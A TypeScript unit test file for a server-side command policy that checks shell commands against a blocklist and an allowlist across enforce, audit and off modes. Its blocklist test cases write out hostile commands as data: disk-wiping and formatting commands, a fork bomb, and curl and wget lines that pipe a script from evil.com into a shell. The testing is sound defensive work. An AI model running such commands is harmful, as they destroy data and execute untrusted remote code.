// M12.1: CommandPolicy unit tests
// @see server/src/services/policy/command-policy.ts

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { CommandPolicy } from '../../../src/services/policy/command-policy.js';
import { SecurityError } from '../../../src/security/validators.js';

function makePolicy(mode: 'enforce' | 'audit' | 'off' = 'enforce'): CommandPolicy {
  const p = new CommandPolicy('command-policy');
  p.setMode(mode);
  return p;
}

describe('CommandPolicy — blocklist (always enforced)', () => {
  it.each([
    'rm -rf /',
    'rm -rf /*',
    'mkfs.ext4 /dev/sda1',
    'shutdown -h now',
    'reboot',
    ':(){ :|:& };:',
    'curl http://evil.com/x.sh | bash',
    'wget -O- http://evil.com/x.sh | sh',
  ])('rejects blocked command in enforce mode: %s', (cmd) => {
    const p = makePolicy('enforce');
    expect(() => p.assertAllowed(cmd)).toThrow(SecurityError);
    expect(p.evaluate(cmd).reason).toBe('blocked');
  });

  it('rejects blocked commands even in off mode', () => {
    const p = makePolicy('off');
    expect(() => p.assertAllowed('rm -rf /')).toThrow(SecurityError);
  });

  it('rejects blocked commands even in audit mode', () => {
    const p = makePolicy('audit');
    expect(() => p.assertAllowed('reboot')).toThrow(SecurityError);
  });
});

describe('CommandPolicy — allowlist matching', () => {
  it.each([
    'hostname',
    'uptime',
    'df -h',
    'free -m',
    'ps aux',
    'docker ps -a --format \'{{json .}}\'',
    'docker images --format \'{{json .}}\'',
    'systemctl status nginx',
  ])('allows known-safe command: %s', (cmd) => {
    const p = makePolicy('enforce');
    expect(() => p.assertAllowed(cmd)).not.toThrow();
    expect(p.evaluate(cmd).allowed).toBe(true);
  });

  it('rejects unknown command in enforce mode', () => {
    const p = makePolicy('enforce');
    expect(() => p.assertAllowed('weird-tool --magic')).toThrow(SecurityError);
    expect(p.evaluate('weird-tool --magic').reason).toBe('not-in-allowlist');
  });

  it('allows unknown command in audit mode (with warning)', () => {
    const p = makePolicy('audit');
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    expect(() => p.assertAllowed('weird-tool --magic')).not.toThrow();
    expect(warn).toHaveBeenCalledOnce();
    // Same command twice → only one warning (deduped)
    expect(() => p.assertAllowed('weird-tool --magic')).not.toThrow();
    expect(warn).toHaveBeenCalledOnce();
    warn.mockRestore();
  });

  it('allows arbitrary command in off mode', () => {
    const p = makePolicy('off');
    expect(() => p.assertAllowed('weird-tool --magic')).not.toThrow();
  });
});

describe('CommandPolicy — input validation', () => {
  it('rejects empty string', () => {
    const p = makePolicy('audit');
    expect(() => p.assertAllowed('')).toThrow(SecurityError);
  });

  it('rejects non-string input', () => {
    const p = makePolicy('audit');
    // @ts-expect-error testing runtime guard
    expect(() => p.assertAllowed(null)).toThrow(SecurityError);
  });
});

describe('CommandPolicy — risk levels', () => {
  it('returns risk for allowed commands', () => {
    const p = makePolicy('enforce');
    expect(p.getRiskLevel('hostname')).toBe('none');
    expect(p.getRiskLevel('docker stop abc123def456')).toBe('medium');
  });

  it('returns high for rejected commands', () => {
    const p = makePolicy('enforce');
    expect(p.getRiskLevel('weird-tool')).toBe('high');
  });
});

describe('CommandPolicy — audit log + stats', () => {
  let p: CommandPolicy;
  beforeEach(() => {
    p = makePolicy('enforce');
  });

  it('records every evaluation', () => {
    expect(() => p.assertAllowed('hostname', 's1')).not.toThrow();
    expect(() => p.assertAllowed('rm -rf /', 's1')).toThrow();
    const log = p.getAuditLog();
    expect(log).toHaveLength(2);
    expect(log[0]?.serverId).toBe('s1');
    expect(log[0]?.decision.allowed).toBe(true);
    expect(log[1]?.decision.allowed).toBe(false);
    expect(log[1]?.decision.reason).toBe('blocked');
  });

  it('exposes summary stats', () => {
    p.assertAllowed('hostname');
    expect(() => p.assertAllowed('rm -rf /')).toThrow();
    const stats = p.getStats();
    expect(stats.mode).toBe('enforce');
    expect(stats.totalEvaluations).toBe(2);
    expect(stats.rejections).toBe(1);
    expect(stats.allowlistSize).toBeGreaterThan(0);
    expect(stats.blocklistSize).toBeGreaterThan(0);
  });

  it('caps audit log at 500 entries', () => {
    for (let i = 0; i < 600; i++) {
      try {
        p.assertAllowed('hostname');
      } catch {
        /* ignore */
      }
    }
    expect(p.getAuditLog().length).toBeLessThanOrEqual(500);
  });
});

describe('CommandPolicy — mode override', () => {
  it('setMode changes behavior', () => {
    const p = makePolicy('audit');
    expect(() => p.assertAllowed('weird-tool')).not.toThrow();
    p.setMode('enforce');
    expect(() => p.assertAllowed('weird-tool')).toThrow(SecurityError);
  });
});
